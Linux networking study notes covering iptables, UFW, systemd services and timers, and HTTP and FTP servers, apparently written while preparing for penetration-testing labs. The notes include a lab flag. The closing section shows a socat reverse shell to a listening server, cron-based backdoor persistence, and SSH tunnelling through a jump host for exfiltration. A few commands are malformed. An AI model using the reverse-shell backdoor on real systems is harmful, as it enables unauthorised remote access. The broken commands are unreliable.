# Linux Networking and Services

Topics
- ACLs Overview and - Netfilter Introduction
- IPTables (Parameters, Modifying Rules with -A/-D/-I)
- IPTables (Extended Rules and Default Policies)
- UFW and FWBuilder
- Managing Network Services
- SSH
- HTTP
- FTP (pure-ftpd)
- Linux Networking Practica

## IP Tables

IPTables is a stateless firewall, by default. This can be changed to stateful, if desired.  Firewall have a default policy. Accept policy means that any connection is accepted if they are not dropped by the rules. Drop policy mean that an connection is dropped if they are not accepted by the rules. The rules are executed from top to bottom.

The iptables rules MUST be saved, otherwise the are not persistent!

`sudo iptables-save`

List iptables with options 
* -n view IPs only
* -v view bytes
```
sudo iptables -L
sudo iptables -nvL
```
Configure DROP for the FORWARD chain, if we don't configure a linux router

`sudo iptables -P FORWARD DROP`

It's a good practice to add a DROP action for any packet that has an INVALID connection state.

`sudo iptables -I INPUT 2 -m conntrack --ctstate INVALID -j DROP`

Append 192.168.1.0/24 on all protocols to INPUT chain with DROP option
* -j DROP
* -j ACCEPT
* -j REJECT

`sudo iptables -s 192.168.1.0/24 -p all -A INPUT -j DROP`

Append 127.0.0.1 (IPv4 localhost) and delete it again

```
sudo iptables -s 127.0.0.1 -d 127.0.0.1 -p all -A INPUT -j DROP
sudo iptables - 127.0.0.1 -D INPUT
```

Delete INPUT rule by line number

```
sudo iptables -L --line-numbers
sudo iptables -D INPUT 2
```

Insert INPUT rule by line number

```
sudo -s 192.168.1.37 -I INPUT 1 -j DROP
sudo iptables -L --line-numbers
```

Replace INPUT rule by line number with DROP option
* --sport source port
* --dport destination port

```
sudo iptables -R INPUT 2 -s 192.168.1.0/24 -j DROP
sudo iptables -R INPUT 1 -s 192.168.1.37 -d 127.0.0.1 -p tcp --dport 8080
```

Using **conntrack** will make iptables a *stateful firewall. The stateful firewall settings will ensure that packets that are part of an existing connection will be allowed to communicate. 

```
sudo iptables -I INPUT 1 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
```

## UFW and FWBuilder

IP Tables has frontends to make configuration easiers: Uncomplicated Firewall (UFW) and FWBuilder.

It is a simple tool to add firewall rules based on the applications installed on a host. To display a list of applications that UFW can affect, we'll run ufw app list.

```
sudo apt install ufw
sudo ufw status
sudo ufw app list
sudo ufw app info SSH
sudo ufw allow SSH
sudo ufw allow 22/tcp
sudo ufw allow 5060:5061/tcp
sudo ufw enable
sudo ufw status verbose
sudo ufw allow in from 64.63.62.61 to any port 22
sudo ufw allow out from 192.168.1.0/24 to any port 3306
sudo ufw allow proto tcp to any port 80
sudo ufw deny proto tcp from 23.24.25.0/24 to any port 80,443
sudo ufw status numbered
sudo ufw delete 2
sudo ufw delete allow 8069
```

To allow connections on a particular network interface, use the in on keyword followed by the name of the network interface:

`sudo ufw allow in on eth2 to any port 3306`

Disable the UFW and undo all changes

`sudo ufw reset`

IP-Masquarade uses IPTables Syntax:

https://linuxize.com/post/how-to-setup-a-firewall-with-ufw-on-ubuntu-20-04/#ip-masquerading

Walk through "Use ufw to open HTTP ports. The flag will appear in the /root directory."

```
[root@ufw ~]# cat /opt/ufw.watch.py
#!/usr/bin/python3

import re
import os
import time

while 1:
    time.sleep(10)
    if not os.path.isfile('/root/UFW{That_was_not_very_C0mpl1c4t3d}'):
        with open("/var/lib/ufw/user.rules","r") as file:
            for line in file:
                if re.search("-p tcp --dport 80 -j ACCEPT", line):
                    os.system("touch /root/UFW{That_was_not_very_C0mpl1c4t3d}") 
```


Change the default policy for chain.

```
sudo nano /etc/default/ufw
sudo ufw default <policy> <chain>
sudo ufw default ACCEPT incoming
sudo ufw default ACCEPT outgoing
```

An application profile is a text file in INI format that describes the service and contains firewall rules for the service. Application profiles are created in the /etc/ufw/applications.d directory during the installation of the package.


The UFW has a GUI front end.

`sudo apt install fwbuilder`



### SysV (legacy)

We can work with services outside of runlevels, with manual execution of the scripts in the /etc/init.d/ directory. Let's start the SSH service.

```
ll /etc/rc#.d/
ll /etc/rc2.d/
ll /etc/init.d/
/etc/init.d/ ssh start
/etc/init.d/ ssh status
... or ...
sudo service ssh start
sudo service ssh status
```

More about Linux Runlevels

https://www.geeksforgeeks.org/run-levels-linux/
https://wiki.archlinux.org/title/SysVinit 

`who -r`

### Systemd

Cheat Sheet
https://access.redhat.com/sites/default/files/attachments/12052018_systemd_6.pdf

Most Linux systems today are using a service startup system called Systemd.1 With this usage, it is important to understand how the services are managed. Systemd is the first process that will start other services. The targets allow granular definition of different "runlevels". The services and targets located in /usr/lib/systemd/system/.


```
ps 1
file /sbin/init
```

Service scripts explained: e.g. SSH

`cat /usr/lib/systemd/system/ssh.service`

Start up with graphical user interface by default

```
sudo systemctl get-default
sudo systemctl set-default graphical.target
```


More Systemd Unit type are explained here:

The targets allow granular definition and grouping of different "runlevels". The default systemd units like services and targets located in /usr/lib/systemd/system/.

```
sudo systemctl list-units --type=target --all
sudo systemctl list-units --type=mount --all
ll /usr/lib/systemd/system/
ll /etc/systemd/system
```

https://www.linode.com/docs/guides/what-is-systemd/#systemd-units

Using Systemd Timer units as alternative to cron jobs

* create an execution script e.g. mysql backup
* create a service that calls the script
* create a timer that executes the service

```
cat /usr/local/bin/my-db-backup.sh
#!/bin/sh

stamp=$(date "+%y-%m-%d-%H-%M")
/usr/bin/mysqldump testdb > ~/backups/my-db-backup-${stamp}.sql
```

```
cat ~/.my.cnf
[mysqldump]
user=mysqluser
password=mypassword
```

```
cat /etc/systemd/system/my-db-backup.service
[Unit]
Description=A script to backup mysql database named testdb

[Service]
# The location of the mysql backup script
ExecStart=/usr/local/bin/my-db-backup.sh
```

```
cat /etc/systemd/system/my-db-backup.timer
[Unit]
Description=Runs my-db-backup.sh every hour

[Timer]
# Amount of time to wait after booting before the service runs for the first time
OnBootSec=10min
# The time between running each consecutive timer
OnUnitActiveSec=1h
# Name of the service file that will be called
Unit=my-db-backup.service

[Install]
# Defines which service triggers the custom service on boot
WantedBy=multi-user.target
```


```
systemd-analyze verify /etc/systemd/system/my-db-backup.timer
systemctl enable my-db-backup.timer
systemctl start my-db-backup.timer
```

## Start HTTP servers

Now that we covered two ways to start a web server, we can use this on penetration test engagements to download files into a compromised host.

* Apache2
* Python3

```
sudo systemctl start apache2
sudo python3 -m http.server 80
```

## Start FTPd servers

```
sudo apt update && sudo apt install pure-ftpd
```

Configure the Pure FTP server using the script

```
cat ./setup-ftp.sh
#!/bin/bash

sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
sudo pure-pw useradd offsec -u ftpuser -d /ftphome
sudo pure-pw mkdb
sudo cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /ftphome
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd
```
## Using SSH jump server to exfiltrate data from web server on the internal network

Install Socat Reverse Shell Backdoor

* client install a cron job via crontab backdoor
* client forwards the /bin/sh, when the server listens on port 101
* server starts a listener on port 101 and returns payload to stdout

```
client$ cat run.sh
#!/bin/bash
socat tcp-connect:server:101 exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

```
client$ cat install.sh
# Setup a cron job 
echo "SHELL=/bin/bash
* * * * * /run.sh >> /var/log/cron.log 2>&1
# This extra line makes it a valid cron" > backdoor.txt
crontab backdoor.txt

```

```
client$ socat tcp-connect:server:101 exec:/bin/sh,pty,stderr,setsid,sigint,sane
server$ socat tcp-listen:101 stdout
/bin/bash
```
Install SSH Tunnel to WebServer

* localhost install a local SSH tunnel to forward web server content to localhost
* localhost navigates with the browser to localhost:8080 to view web content

```
localhost$ ssh user@jumphost -L 8080:webserver:80 -N
localhost$ curl -v http://localhost:8080
```


